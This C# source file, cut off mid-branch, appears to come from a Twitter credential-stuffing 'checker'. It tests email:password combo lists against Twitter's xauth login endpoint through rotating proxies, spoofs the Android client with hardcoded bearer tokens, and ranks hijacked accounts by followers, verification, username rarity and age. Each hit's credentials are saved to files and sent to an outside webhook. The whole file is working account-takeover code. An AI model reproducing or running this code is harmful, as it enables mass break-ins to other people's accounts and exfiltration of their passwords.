using System;
using System.Collections.Specialized;
using System.Drawing;
using System.IO;
using System.Net;
using System.Threading;
using Colorful;
using Leaf.xNet;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using TwitterChecker;

internal class Request
{
	private static Random lineRandom = new Random();

	public static string url = readConfig.webhookurl;

	public static string avatar = "https://i.ibb.co/gzvcMZ6/Webp-net-resizeimage.png";

	public static string quotz = "```";

	public static void SendWebhook(string url, string username, string content)
	{
		if (readConfig.usewebhook)
		{
			WebClient webClient = new WebClient();
			try
			{
				webClient.UploadValues(url, new NameValueCollection
				{
					{
						"content",
						quotz + content + quotz
					},
					{ "username", username },
					{ "avatar_url", avatar }
				});
			}
			catch (WebException ex)
			{
				System.Console.WriteLine(ex.ToString());
			}
		}
	}

	public static void Start(Data combo)
	{
		int num = 0;
		int num2 = 3;
		try
		{
			using HttpRequest httpRequest = new HttpRequest();
			if (readConfig.useProxy)
			{
				string text = Helper.ProxyList[lineRandom.Next(0, Helper.ProxyList.Count - 1)];
				string[] array = text.Split(':');
				if (readConfig.proxyType.ToLower() == "http" || readConfig.proxyType.ToLower() == "https")
				{
					httpRequest.Proxy = HttpProxyClient.Parse(array[0] + ":" + array[1]);
					if (array.Length == 4)
					{
						httpRequest.Proxy.Username = array[2].ToString();
						httpRequest.Proxy.Password = array[3].ToString();
					}
				}
				else if (readConfig.proxyType.ToLower() == "socks4")
				{
					httpRequest.Proxy = Socks4ProxyClient.Parse(array[0] + ":" + array[1]);
					if (array.Length == 4)
					{
						httpRequest.Proxy.Username = array[2].ToString();
						httpRequest.Proxy.Password = array[3].ToString();
					}
				}
				else if (readConfig.proxyType.ToLower() == "socks5")
				{
					httpRequest.Proxy = Socks5ProxyClient.Parse(array[0] + ":" + array[1]);
					if (array.Length == 4)
					{
						httpRequest.Proxy.Username = array[2].ToString();
						httpRequest.Proxy.Password = array[3].ToString();
					}
				}
				else
				{
					Colorful.Console.WriteLine("Invalid type proxy!", Color.Red);
					Colorful.Console.ReadLine();
					Environment.Exit(0);
				}
			}
			httpRequest.IgnoreProtocolErrors = true;
			httpRequest.Cookies = new CookieStorage();
			httpRequest.UseCookies = true;
			httpRequest.UserAgentRandomize();
			httpRequest.AddHeader("Authorization", "Basic M25WdVNvQlpueDZVNHZ6VXhmNXc6QmNzNTlFRmJic2RGNlNsOU5nNzFzbWdTdFdFR3dYWEtTall2UFZ0N3F5cw==");
			dynamic val = JsonConvert.DeserializeObject(httpRequest.Post("https://api.twitter.com/oauth2/token", "grant_type=client_credentials", "application/x-www-form-urlencoded").ToString());
			string text2 = val["access_token"];
			httpRequest.AddHeader("Authorization", "Bearer " + text2);
			dynamic val2 = JsonConvert.DeserializeObject(httpRequest.Post("https://api.twitter.com/1.1/guest/activate.json", " ", "application/x-www-form-urlencoded").ToString());
			string text3 = val2["guest_token"];
			if (!(text3 != "") || text3 == null || string.IsNullOrWhiteSpace(text3) || string.IsNullOrEmpty(text3))
			{
				Interlocked.Increment(ref Stats.NORMALRETRIES);
				return;
			}
			string value = RandomString("////////////////");
			string value2 = RandomString("////////////////");
			httpRequest.AddHeader("Authorization", "Bearer AAAAAAAAAAAAAAAAAAAAAFXzAwAAAAAAMHCxpeSDG1gLNLghVe8d74hl6k4%3DRUMF4xAQLsbeBhTSRrCiQpJtxoGWeyHrDb5te2jpGskWDFW82F");
			httpRequest.AddHeader("X-Guest-Token", text3);
			httpRequest.AddHeader("Cache-Control", "no-store");
			httpRequest.AddHeader("X-B3-TraceId", "32c88b1d79400512");
			httpRequest.AddHeader("X-Twitter-Client-AdID", "9d4da21e-93cd-4eeb-8d20-4f6cc34bf7ba");
			httpRequest.AddHeader("Accept-Encoding", "zstd, gzip, deflate");
			httpRequest.AddHeader("Timezone", "America/Regina");
			httpRequest.UserAgent = "TwitterAndroid/8.19.0-release.01 (18190001-r-1) LGM-V300K/5.1.1 (LGE;LGM-V300K;Android;LGM-V300K;0;;1;2014)";
			httpRequest.AddHeader("X-Twitter-Client-DeviceID", value);
			httpRequest.AddHeader("X-Twitter-Client-Language", "en-US");
			httpRequest.AddHeader("X-Twitter-Client", "TwitterAndroid");
			httpRequest.AddHeader("X-Twitter-API-Version", "5");
			httpRequest.AddHeader("Optimize-Body", "true");
			httpRequest.AddHeader("X-Twitter-Active-User", "yes");
			httpRequest.AddHeader("X-Twitter-Client-Version", "8.19.0-release.01");
			httpRequest.AddHeader("X-Guest-UUID", value2);
			httpRequest.AddHeader("Accept", "application/json");
			string text4 = httpRequest.Post("https://api.twitter.com/auth/1/xauth_password.json", "x_auth_identifier=" + combo.Email + "&x_auth_password=" + combo.Pass + "&send_error_codes=true&x_auth_login_challenge=1&x_auth_login_verification=1&x_auth_country_code=US&ui_metrics=", "application/x-www-form-urlencoded").ToString();
			dynamic val3 = JsonConvert.DeserializeObject(text4);
			if (text4.Contains("oauth_token"))
			{
				string text5 = val3["user_id"];
				string text6 = val3["screen_name"];
				httpRequest.AddHeader("Authorization", "Bearer AAAAAAAAAAAAAAAAAAAAAFXzAwAAAAAAMHCxpeSDG1gLNLghVe8d74hl6k4%3DRUMF4xAQLsbeBhTSRrCiQpJtxoGWeyHrDb5te2jpGskWDFW82F");
				string text7 = httpRequest.Get("https://api.twitter.com/graphql/FRRB-roWdcG2bdd6zarvHA/UserByIdQuery?variables=%7B%22includeAdsSubscription%22%3Atrue%2C%22includeHighlightedLabel%22%3Afalse%2C%22rest_id%22%3A%22" + text5 + "%22%7D").ToString();
				Root root = JsonConvert.DeserializeObject<Root>(text7);
				if (text7.Contains("User has been suspended"))
				{
					return;
				}
				if (text7.Contains("{\"data\":{\"user\":"))
				{
					if (Stats.DRUGICHECKED < Uploader.accountList.Count)
					{
						Stats.DRUGICHECKED++;
					}
					int normal_followers_count = root.data.user.legacy.normal_followers_count;
					bool verified = root.data.user.legacy.verified;
					bool is_translator = root.data.user.legacy.is_translator;
					string created_at = root.data.user.legacy.created_at;
					string text8 = created_at.Substring(created_at.IndexOf(' ') + 23);
					string text9 = " " + readConfig.comboSplit + " ";
					string screen_name = root.data.user.legacy.screen_name;
					string profile_image_url_https = root.data.user.legacy.profile_image_url_https;
					string text10 = (string.IsNullOrEmpty(root.data.user.legacy.location) ? "Undefined" : root.data.user.legacy.location);
					string json = httpRequest.Get("https://api.myip.com/").ToString();
					JObject jObject = JObject.Parse(json);
					string text11 = (string)jObject["ip"];
					string text12 = (string)jObject["country"];
					if (Helper.ogNick.Contains(screen_name.ToLower()))
					{
						if (readConfig.useOG)
						{
							if (readConfig.useogusernames)
							{
								string username = "OG Usernames";
								string content = combo.Email + ":" + combo.Pass + text9 + "Username: " + screen_name + text9 + "Followers: " + normal_followers_count + text9 + "Created: " + text8 + text9 + "Country: " + text10 + text9 + "Proxy IP: " + text11 + " (" + text12 + ")";
								SendWebhook(url, username, content);
							}
							Stats.NORMALOGUSERNAME++;
							Save.Writeline("| Login: " + combo.Email + ":" + combo.Pass, "OG Username [" + screen_name.Length + "L]", Save.mainDir + "/OG/");
							Save.Writeline("| Username: @" + screen_name, "OG Username [" + screen_name.Length + "L]", Save.mainDir + "/OG/");
							Save.Writeline("| Followers: " + normal_followers_count, "OG Username [" + screen_name.Length + "L]", Save.mainDir + "/OG/");
							Save.Writeline("| Created: " + text8, "OG Username [" + screen_name.Length + "L]", Save.mainDir + "/OG/");
							Save.Writeline("| Country: " + text10, "OG Username [" + screen_name.Length + "L]", Save.mainDir + "/OG/");
							Save.Writeline("| Proxy IP: " + text11 + " (" + text12 + ")", "OG Username [" + screen_name.Length + "L]", Save.mainDir + "/OG/");
							Save.Writeline("   ", "OG Username [" + screen_name.Length + "L]", Save.mainDir + "/OG/");
							Save.Writeline(combo.Email + ":" + combo.Pass + text9 + "Username: " + screen_name + text9 + "Followers: " + normal_followers_count + text9 + "Created: " + text8 + text9 + "Country: " + text10 + text9 + "Proxy IP: " + text11 + " (" + text12 + ")", "line_OG Username [" + screen_name.Length + "L]", Save.mainDir + "/OG/");
							Save.Writeline(combo.Email + ":" + combo.Pass, "email_pass", Save.mainDir + "/RawHits/");
							Save.Writeline(screen_name + ":" + combo.Pass, "user_pass", Save.mainDir + "/RawHits/");
						}
						return;
					}
					if (verified)
					{
						if (readConfig.useverifieds)
						{
							string username2 = "Verifieds";
							string content2 = combo.Email + ":" + combo.Pass + text9 + "Username: " + screen_name + text9 + "Followers: " + normal_followers_count + text9 + "Created: " + text8 + text9 + "Country: " + text10 + text9 + "Proxy IP: " + text11 + " (" + text12 + ")";
							SendWebhook(url, username2, content2);
						}
						Stats.NORMALVERIFIEDS++;
						Save.Writeline("| Login: " + combo.Email + ":" + combo.Pass, "Verified", Save.mainDir + "/Verifieds/");
						Save.Writeline("| Username: @" + screen_name, "Verified", Save.mainDir + "/Verifieds/");
						Save.Writeline("| Followers: " + normal_followers_count, "Verified", Save.mainDir + "/Verifieds/");
						Save.Writeline("| Created: " + text8, "Verified", Save.mainDir + "/Verifieds/");
						Save.Writeline("| Country: " + text10, "Verified", Save.mainDir + "/Verifieds/");
						Save.Writeline("| Proxy IP: " + text11 + " (" + text12 + ")", "Verified", Save.mainDir + "/Verifieds/");
						Save.Writeline("   ", "Verified", Save.mainDir + "/Verifieds/");
						Save.Writeline(combo.Email + ":" + combo.Pass + text9 + "Username: " + screen_name + text9 + "Followers: " + normal_followers_count + text9 + "Created: " + text8 + text9 + "Country: " + text10 + text9 + "Proxy IP: " + text11 + " (" + text12 + ")", "line_Verified", Save.mainDir + "/Verifieds/");
						Save.Writeline(combo.Email + ":" + combo.Pass, "email_pass", Save.mainDir + "/RawHits/");
						Save.Writeline(screen_name + ":" + combo.Pass, "user_pass", Save.mainDir + "/RawHits/");
						return;
					}
					if (profile_image_url_https.Contains(".gif"))
					{
						string tempPath = Path.GetTempPath();
						using (WebClient webClient = new WebClient())
						{
							webClient.DownloadFile(profile_image_url_https, tempPath + "tempnorm.gif");
						}
						using (Image image = Image.FromFile(tempPath + "tempnorm.gif"))
						{
							if (ImageAnimator.CanAnimate(image))
							{
								if (readConfig.usegif)
								{
									string username3 = "GIF Profile";
									string content3 = combo.Email + ":" + combo.Pass + text9 + "Username: " + screen_name + text9 + "Followers: " + normal_followers_count + text9 + "Created: " + text8 + text9 + "Country: " + text10 + text9 + "Proxy IP: " + text11 + " (" + text12 + ")";
									SendWebhook(url, username3, content3);
								}
								Stats.NORMALGIF++;
								Save.Writeline("| Login: " + combo.Email + ":" + combo.Pass, "GIF", Save.mainDir + "/GIF/");
								Save.Writeline("| Username: @" + screen_name, "GIF", Save.mainDir + "/GIF/");
								Save.Writeline("| Followers: " + normal_followers_count, "GIF", Save.mainDir + "/GIF/");
								Save.Writeline("| Created: " + text8, "GIF", Save.mainDir + "/GIF/");
								Save.Writeline("| Country: " + text10, "GIF", Save.mainDir + "/GIF/");
								Save.Writeline("| Proxy IP: " + text11 + "(" + text12 + ")", "GIF", Save.mainDir + "/GIF/");
								Save.Writeline("   ", "GIF", Save.mainDir + "/GIF/");
								Save.Writeline(combo.Email + ":" + combo.Pass + text9 + "Username: " + screen_name + text9 + "Followers: " + normal_followers_count + text9 + "Created: " + text8 + text9 + "Country: " + text10 + text9 + "Proxy IP: " + text11 + " (" + text12 + ")", "line_GIF", Save.mainDir + "/GIF/");
								Save.Writeline(combo.Email + ":" + combo.Pass, "email_pass", Save.mainDir + "/RawHits/");
								Save.Writeline(screen_name + ":" + combo.Pass, "user_pass", Save.mainDir + "/RawHits/");
							}
						}
						return;
					}
					if (is_translator)
					{
						if (readConfig.usetranslators)
						{
							string username4 = "Translators";
							string content4 = combo.Email + ":" + combo.Pass + text9 + "Username: " + screen_name + text9 + "Followers: " + normal_followers_count + text9 + "Created: " + text8 + text9 + "Country: " + text10 + text9 + "Proxy IP: " + text11 + " (" + text12 + ")";
							SendWebhook(url, username4, content4);
						}
						Stats.NORMALTRANSLATOR++;
						Save.Writeline("| Login: " + combo.Email + ":" + combo.Pass, "Translator", Save.mainDir + "/Translators/");
						Save.Writeline("| Username: @" + screen_name, "Translator", Save.mainDir + "/Translators/");
						Save.Writeline("| Followers: " + normal_followers_count, "Translator", Save.mainDir + "/Translators/");
						Save.Writeline("| Created: " + text8, "Translator", Save.mainDir + "/Translators/");
						Save.Writeline("| Country: " + text10, "Translator", Save.mainDir + "/Translators/");
						Save.Writeline("| Proxy IP: " + text11 + " (" + text12 + ")", "Translator", Save.mainDir + "/Translators/");
						Save.Writeline("   ", "Translator", Save.mainDir + "/Translators/");
						Save.Writeline(combo.Email + ":" + combo.Pass + text9 + "Username: " + screen_name + text9 + "Followers: " + normal_followers_count + text9 + "Created: " + text8 + text9 + "Country: " + text10 + text9 + "Proxy IP: " + text11 + " (" + text12 + ")", "line_Translator", Save.mainDir + "/Translators/");
						Save.Writeline(combo.Email + ":" + combo.Pass, "email_pass", Save.mainDir + "/RawHits/");
						Save.Writeline(screen_name + ":" + combo.Pass, "user_pass", Save.mainDir + "/RawHits/");
						return;
					}
					if (screen_name.Length == 1 || screen_name.Length == 2 || screen_name.Length == 3 || screen_name.Length == 4)
					{
						if (readConfig.use4l)
						{
							string username5 = "1 - 4 Letters";
							string content5 = combo.Email + ":" + combo.Pass + text9 + "Username: " + screen_name + text9 + "Followers: " + normal_followers_count + text9 + "Created: " + text8 + text9 + "Country: " + text10 + text9 + "Proxy IP: " + text11 + " (" + text12 + ")";
							SendWebhook(url, username5, content5);
						}
						Stats.NORMALLETTERNICK++;
						Save.Writeline("| Login: " + combo.Email + ":" + combo.Pass, screen_name.Length + " Letters", Save.mainDir + "/1-4 Letters/");
						Save.Writeline("| Username: @" + screen_name, screen_name.Length + " Letters", Save.mainDir + "/1-4 Letters/");
						Save.Writeline("| Followers: " + normal_followers_count, screen_name.Length + " Letters", Save.mainDir + "/1-4 Letters/");
						Save.Writeline("| Created: " + text8, screen_name.Length + " Letters", Save.mainDir + "/1-4 Letters/");
						Save.Writeline("| Country: " + text10, screen_name.Length + " Letters", Save.mainDir + "/1-4 Letters/");
						Save.Writeline("| Proxy IP: " + text11 + " (" + text12 + ")", screen_name.Length + " Letters", Save.mainDir + "/1-4 Letters/");
						Save.Writeline("   ", screen_name.Length + " Letters", Save.mainDir + "/1-4 Letters/");
						Save.Writeline(combo.Email + ":" + combo.Pass + text9 + "Username: " + screen_name + text9 + "Followers: " + normal_followers_count + text9 + "Created: " + text8 + text9 + "Country: " + text10 + text9 + "Proxy IP: " + text11 + " (" + text12 + ")", "line_" + screen_name.Length + " Letters", Save.mainDir + "/1-4 Letters/");
						Save.Writeline(combo.Email + ":" + combo.Pass, "email_pass", Save.mainDir + "/RawHits/");
						Save.Writeline(screen_name + ":" + combo.Pass, "user_pass", Save.mainDir + "/RawHits/");
						return;
					}
					if (normal_followers_count > 1000 && 10000 > normal_followers_count)
					{
						if (readConfig.use1kto10k)
						{
							string username6 = "1K - 10K";
							string content6 = combo.Email + ":" + combo.Pass + text9 + "Username: " + screen_name + text9 + "Followers: " + normal_followers_count + text9 + "Created: " + text8 + text9 + "Country: " + text10 + text9 + "Proxy IP: " + text11 + " (" + text12 + ")";
							SendWebhook(url, username6, content6);
						}
						Stats.DODESET++;
						Save.Writeline("| Login: " + combo.Email + ":" + combo.Pass, "1K+", Save.mainDir + "/Followers/");
						Save.Writeline("| Username: @" + screen_name, "1K+", Save.mainDir + "/Followers/");
						Save.Writeline("| Followers: " + normal_followers_count, "1K+", Save.mainDir + "/Followers/");
						Save.Writeline("| Created: " + text8, "1K+", Save.mainDir + "/Followers/");
						Save.Writeline("| Country: " + text10, "1K+", Save.mainDir + "/Followers/");
						Save.Writeline("| Proxy IP: " + text11 + " (" + text12 + ")", "1K+", Save.mainDir + "/Followers/");
						Save.Writeline("   ", "1K+", Save.mainDir + "/Followers/");
						Save.Writeline(combo.Email + ":" + combo.Pass + text9 + "Username: " + screen_name + text9 + "Followers: " + normal_followers_count + text9 + "Created: " + text8 + text9 + "Country: " + text10 + text9 + "Proxy IP: " + text11 + " (" + text12 + ")", "line_1K+", Save.mainDir + "/Followers/");
						Save.Writeline(combo.Email + ":" + combo.Pass, "email_pass", Save.mainDir + "/RawHits/");
						Save.Writeline(screen_name + ":" + combo.Pass, "user_pass", Save.mainDir + "/RawHits/");
						return;
					}
					if (normal_followers_count > 10000 && 20000 > normal_followers_count)
					{
						if (readConfig.use10kto20k)
						{
							string username7 = "10K - 20K";
							string content7 = combo.Email + ":" + combo.Pass + text9 + "Username: " + screen_name + text9 + "Followers: " + normal_followers_count + text9 + "Created: " + text8 + text9 + "Country: " + text10 + text9 + "Proxy IP: " + text11 + " (" + text12 + ")";
							SendWebhook(url, username7, content7);
						}
						Stats.DODVADESET++;
						Save.Writeline("| Login: " + combo.Email + ":" + combo.Pass, "10K+", Save.mainDir + "/Followers/");
						Save.Writeline("| Username: @" + screen_name, "10K+", Save.mainDir + "/Followers/");
						Save.Writeline("| Followers: " + normal_followers_count, "10K+", Save.mainDir + "/Followers/");
						Save.Writeline("| Created: " + text8, "10K+", Save.mainDir + "/Followers/");
						Save.Writeline("| Country: " + text10, "10K+", Save.mainDir + "/Followers/");
						Save.Writeline("| Proxy IP: " + text11 + " (" + text12 + ")", "10K+", Save.mainDir + "/Followers/");
						Save.Writeline("   ", "10K+", Save.mainDir + "/Followers/");
						Save.Writeline(combo.Email + ":" + combo.Pass + text9 + "Username: " + screen_name + text9 + "Followers: " + normal_followers_count + text9 + "Created: " + text8 + text9 + "Country: " + text10 + text9 + "Proxy IP: " + text11 + " (" + text12 + ")", "line_10K+", Save.mainDir + "/Followers/");
						Save.Writeline(combo.Email + ":" + combo.Pass, "email_pass", Save.mainDir + "/RawHits/");
						Save.Writeline(screen_name + ":" + combo.Pass, "user_pass", Save.mainDir + "/RawHits/");
						return;
					}
					if (normal_followers_count > 20000 && 30000 > normal_followers_count)
					{
						if (readConfig.use20kto30k)
						{
							string username8 = "20K - 30K";
							string content8 = combo.Email + ":" + combo.Pass + text9 + "Username: " + screen_name + text9 + "Followers: " + normal_followers_count + text9 + "Created: " + text8 + text9 + "Country: " + text10 + text9 + "Proxy IP: " + text11 + " (" + text12 + ")";
							SendWebhook(url, username8, content8);
						}
						Stats.DOTRIDESET++;
						Save.Writeline("| Login: " + combo.Email + ":" + combo.Pass, "20K+", Save.mainDir + "/Followers/");
						Save.Writeline("| Username: @" + screen_name, "20K+", Save.mainDir + "/Followers/");
						Save.Writeline("| Followers: " + normal_followers_count, "20K+", Save.mainDir + "/Followers/");
						Save.Writeline("| Created: " + text8, "20K+", Save.mainDir + "/Followers/");
						Save.Writeline("| Country: " + text10, "20K+", Save.mainDir + "/Followers/");
						Save.Writeline("| Proxy IP: " + text11 + " (" + text12 + ")", "20K+", Save.mainDir + "/Followers/");
						Save.Writeline("   ", "20K+", Save.mainDir + "/Followers/");
						Save.Writeline(combo.Email + ":" + combo.Pass + text9 + "Username: " + screen_name + text9 + "Followers: " + normal_followers_count + text9 + "Created: " + text8 + text9 + "Country: " + text10 + text9 + "Proxy IP: " + text11 + " (" + text12 + ")", "line_30K+", Save.mainDir + "/Followers/");
						Save.Writeline(combo.Email + ":" + combo.Pass, "email_pass", Save.mainDir + "/RawHits/");
						Save.Writeline(screen_name + ":" + combo.Pass, "user_pass", Save.mainDir + "/RawHits/");
						return;
					}
					if (normal_followers_count > 30000 && 50000 > normal_followers_count)
					{
						if (readConfig.use30kto50k)
						{
							string username9 = "30K - 50K";
							string content9 = combo.Email + ":" + combo.Pass + text9 + "Username: " + screen_name + text9 + "Followers: " + normal_followers_count + text9 + "Created: " + text8 + text9 + "Country: " + text10 + text9 + "Proxy IP: " + text11 + " (" + text12 + ")";
							SendWebhook(url, username9, content9);
						}
						Stats.DOPEDESET++;
						Save.Writeline("| Login: " + combo.Email + ":" + combo.Pass, "30K+", Save.mainDir + "/Followers/");
						Save.Writeline("| Username: @" + screen_name, "30K+", Save.mainDir + "/Followers/");
						Save.Writeline("| Followers: " + normal_followers_count, "30K+", Save.mainDir + "/Followers/");
						Save.Writeline("| Created: " + text8, "30K+", Save.mainDir + "/Followers/");
						Save.Writeline("| Country: " + text10, "30K+", Save.mainDir + "/Followers/");
						Save.Writeline("| Proxy IP: " + text11 + " (" + text12 + ")", "30K+", Save.mainDir + "/Followers/");
						Save.Writeline("   ", "30K+", Save.mainDir + "/Followers/");
						Save.Writeline(combo.Email + ":" + combo.Pass + text9 + "Username: " + screen_name + text9 + "Followers: " + normal_followers_count + text9 + "Created: " + text8 + text9 + "Country: " + text10 + text9 + "Proxy IP: " + text11 + " (" + text12 + ")", "line_30K+", Save.mainDir + "/Followers/");
						Save.Writeline(combo.Email + ":" + combo.Pass, "email_pass", Save.mainDir + "/RawHits/");
						Save.Writeline(screen_name + ":" + combo.Pass, "user_pass", Save.mainDir + "/RawHits/");
						return;
					}
					if (normal_followers_count > 50000)
					{
						if (readConfig.use50kmore)
						{
							string username10 = "50K+";
							string content10 = combo.Email + ":" + combo.Pass + text9 + "Username: " + screen_name + text9 + "Followers: " + normal_followers_count + text9 + "Created: " + text8 + text9 + "Country: " + text10 + text9 + "Proxy IP: " + text11 + " (" + text12 + ")";
							SendWebhook(url, username10, content10);
						}
						Stats.PREKOPEDESET++;
						Save.Writeline("| Login: " + combo.Email + ":" + combo.Pass, "50K+", Save.mainDir + "/Followers/");
						Save.Writeline("| Username: @" + screen_name, "50K+", Save.mainDir + "/Followers/");
						Save.Writeline("| Followers: " + normal_followers_count, "50K+", Save.mainDir + "/Followers/");
						Save.Writeline("| Created: " + text8, "50K+", Save.mainDir + "/Followers/");
						Save.Writeline("| Country: " + text10, "50K+", Save.mainDir + "/Followers/");
						Save.Writeline("| Proxy IP: " + text11 + " (" + text12 + ")", "50K+", Save.mainDir + "/Followers/");
						Save.Writeline("   ", "50K+", Save.mainDir + "/Followers/");
						Save.Writeline(combo.Email + ":" + combo.Pass + text9 + "Username: " + screen_name + text9 + "Followers: " + normal_followers_count + text9 + "Created: " + text8 + text9 + "Country: " + text10 + text9 + "Proxy IP: " + text11 + " (" + text12 + ")", "line_50K+", Save.mainDir + "/Followers/");
						Save.Writeline(combo.Email + ":" + combo.Pass, "email_pass", Save.mainDir + "/RawHits/");
						Save.Writeline(screen_name + ":" + combo.Pass, "user_pass", Save.mainDir + "/RawHits/");
						return;
					}
					int num3;
					switch (text8)
					{
					default:
						num3 = ((text8 == "2009") ? 1 : 0);
						break;
					case "2006":
					case "2007":
					case "2008":
						num3 = 1;
						break;
					}
					if (num3 != 0)
					{
						if (readConfig.useaged)
						{
							string username11 = "Aged";
							string content11 = combo.Email + ":" + combo.Pass + text9 + "Username: " + screen_name + text9 + "Followers: " + normal_followers_count + text9 + "Created: " + text8 + text9 + "Country: " + text10 + text9 + "Proxy IP: " + text11 + " (" + text12 + ")";
							SendWebhook(url, username11, content11);
						}
						Stats.GOD2006++;
						Save.Writeline("| Login: " + combo.Email + ":" + combo.Pass, "Aged", Save.mainDir + "/Aged/");
						Save.Writeline("| Username: @" + screen_name, "Aged", Save.mainDir + "/Aged/");
						Save.Writeline("| Followers: " + normal_followers_count, "Aged", Save.mainDir + "/Aged/");
						Save.Writeline("| Created: " + text8, "Aged", Save.mainDir + "/Aged/");
						Save.Writeline("| Country: " + text10, "Aged", Save.mainDir + "/Aged/");
						Save.Writeline("| Proxy IP: " + text11 + " (" + text12 + ")", "Aged", Save.mainDir + "/Aged/");
						Save.Writeline("   ", "Aged", Save.mainDir + "/Aged/");
						Save.Writeline(combo.Email + ":" + combo.Pass + text9 + "Username: " + screen_name + text9 + "Followers: " + normal_followers_count + text9 + "Created: " + text8 + text9 + "Country: " + text10 + text9 + "Proxy IP: " + text11 + " (" + text12 + ")", "line_Aged", Save.mainDir + "/Aged/");
						Save.Writeline(combo.Email + ":" + combo.Pass, "email_pass", Save.mainDir + "/RawHits/");
						Save.Writeline(screen_name + ":" + combo.Pass, "user_pass", Save.mainDir + "/RawHits/");
					}
					else
					{
						if (readConfig.usehits)
						{
							string username12 = "Hits";
							string content12 = combo.Email + ":" + combo.Pass + text9 + "Username: " + screen_name + text9 + "Followers: " + normal_followers_count + text9 + "Created: " + text8 + text9 + "Country: " + text10 + text9 + "Proxy IP: " + text11 + " (" + text12 + ")";
							SendWebhook(url, username12, content12);
						}
						Stats.NORMALHITS++;
						Save.Writeline("| Login: " + combo.Email + ":" + combo.Pass, "Hits", Save.mainDir);
						Save.Writeline("| Username: @" + screen_name, "Hits", Save.mainDir);
						Save.Writeline("| Followers: " + normal_followers_count, "Hits", Save.mainDir);
						Save.Writeline("| Created: " + text8, "Hits", Save.mainDir);
						Save.Writeline("| Country: " + text10, "Hits", Save.mainDir);
						Save.Writeline("| Proxy IP: " + text11 + " (" + text12 + ")", "Hits", Save.mainDir);
						Save.Writeline("   ", "Hits", Save.mainDir);
						Save.Writeline(combo.Email + ":" + combo.Pass + text9 + "Username: " + screen_name + text9 + "Followers: " + normal_followers_count + text9 + "Created: " + text8 + text9 + "Country: " + text10 + text9 + "Proxy IP: " + text11 + " (" + text12 + ")", "line_Hits", Save.mainDir);
						Save.Writeline(combo.Email + ":" + combo.Pass, "email_pass", Save.mainDir + "/RawHits/");
						Save.Writeline(screen_name + ":" + combo.Pass, "user_pass", Save.mainDir + "/RawHits/");
					}
				}
				else
				{
					Stats.NORMALHITS++;
					Save.Writeline(combo.Email + ":" + combo.Pass, "Hits-NOCAPTURE", Save.mainDir);
				}
				return;
			}
			if (text4.Contains("login_verification_request_id"))
			{
				if (Stats.DRUGICHECKED < Uploader.accountList.Count)
				{
					Stats.DRUGICHECKED++;
				}
				httpRequest.AddHeader("Authorization", "Bearer AAAAAAAAAAAAAAAAAAAAAFXzAwAAAAAAMHCxpeSDG1gLNLghVe8d74hl6k4%3DRUMF4xAQLsbeBhTSRrCiQpJtxoGWeyHrDb5te2jpGskWDFW82F");
				string text13 = val3["login_verification_user_id"];
				string text14 = httpRequest.Get("https://api.twitter.com/graphql/FRRB-roWdcG2bdd6zarvHA/UserByIdQuery?variables=%7B%22includeAdsSubscription%22%3Atrue%2C%22includeHighlightedLabel%22%3Afalse%2C%22rest_id%22%3A%22" + text13 + "%22%7D").ToString();
				Root root2 = JsonConvert.DeserializeObject<Root>(text14);
				if (text14.Contains("User has been suspended"))
				{
					return;
				}
				if (text14.Contains("{\"data\":{\"user\":"))
				{
					int length = text4.IndexOf("&challenge_id");
					string text15 = text4.Substring(0, length);
					string text16 = text15.Substring(text15.LastIndexOf("type="));
					string text17 = text16.Substring(5);
					int normal_followers_count2 = root2.data.user.legacy.normal_followers_count;
					bool verified2 = root2.data.user.legacy.verified;
					string text18 = " " + readConfig.comboSplit + " ";
					bool is_translator2 = root2.data.user.legacy.is_translator;
					string created_at2 = root2.data.user.legacy.created_at;
					string text19 = created_at2.Substring(created_at2.IndexOf(' ') + 23);
					string screen_name2 = root2.data.user.legacy.screen_name;
					string profile_image_url_https2 = root2.data.user.legacy.profile_image_url_https;
					string text20 = (string.IsNullOrEmpty(root2.data.user.legacy.location) ? "Undefined" : root2.data.user.legacy.location);
					string json2 = httpRequest.Get("https://api.myip.com/").ToString();
					JObject jObject2 = JObject.Parse(json2);
					string text21 = (string)jObject2["ip"];
					string text22 = (string)jObject2["country"];
					if (Helper.ogNick.Contains(screen_name2.ToLower()))
					{
						if (!readConfig.useOG)
						{
							return;
						}
						if (text17 == "RetypeScreenName")
						{
							if (readConfig.useogusernames)
							{
								string username13 = "OG Usernames";
								string content13 = combo.Email + ":" + combo.Pass + text18 + "Username: " + screen_name2 + text18 + "Followers: " + normal_followers_count2 + text18 + "Created: " + text19 + text18 + "Country: " + text20 + text18 + "Proxy IP: " + text21 + " (" + text22 + ")";
								SendWebhook(url, username13, content13);
							}
							Stats.NORMALOGUSERNAME++;
							Save.Writeline("| Login: " + combo.Email + ":" + combo.Pass, "OG Username [" + screen_name2.Length + "L]", Save.mainDir + "/OG/");
							Save.Writeline("| Username: @" + screen_name2, "OG Username [" + screen_name2.Length + "L]", Save.mainDir + "/OG/");
							Save.Writeline("| Followers: " + normal_followers_count2, "OG Username [" + screen_name2.Length + "L]", Save.mainDir + "/OG/");
							Save.Writeline("| Created: " + text19, "OG Username [" + screen_name2.Length + "L]", Save.mainDir + "/OG/");
							Save.Writeline("| Country: " + text20, "OG Username [" + screen_name2.Length + "L]", Save.mainDir + "/OG/");
							Save.Writeline("| Proxy IP: " + text21 + " (" + text22 + ")", "OG Username [" + screen_name2.Length + "L]", Save.mainDir + "/OG/");
							Save.Writeline("   ", "OG Username [" + screen_name2.Length + "L]", Save.mainDir + "/OG/");
							Save.Writeline(combo.Email + ":" + combo.Pass + text18 + "Username: " + screen_name2 + text18 + "Followers: " + normal_followers_count2 + text18 + "Created: " + text19 + text18 + "Country: " + text20 + text18 + "Proxy IP: " + text21 + " (" + text22 + ")", "line_OG Username [" + screen_name2.Length + "L]", Save.mainDir + "/OG/");
							Save.Writeline(combo.Email + ":" + combo.Pass, "email_pass", Save.mainDir + "/RawHits/");
							Save.Writeline(screen_name2 + ":" + combo.Pass, "user_pass", Save.mainDir + "/RawHits/");
							return;
						}
						if (readConfig.useogusernames2)
						{
							string username14 = "[2FA] OG Usernames";
							string content14 = combo.Email + ":" + combo.Pass + text18 + "Username: " + screen_name2 + text18 + "Followers: " + normal_followers_count2 + text18 + "Created: " + text19 + text18 + "Country: " + text20 + text18 + "Challenge: " + text17 + text18 + " Proxy IP: " + text21 + " (" + text22 + ")";
							SendWebhook(url, username14, content14);
						}
						Stats.OGUSERNAME2FA++;
						Save.Writeline("| Login: " + combo.Email + ":" + combo.Pass, "OG Username [" + screen_name2.Length + "L] [2FA]", Save.mainDir + "/OG/");
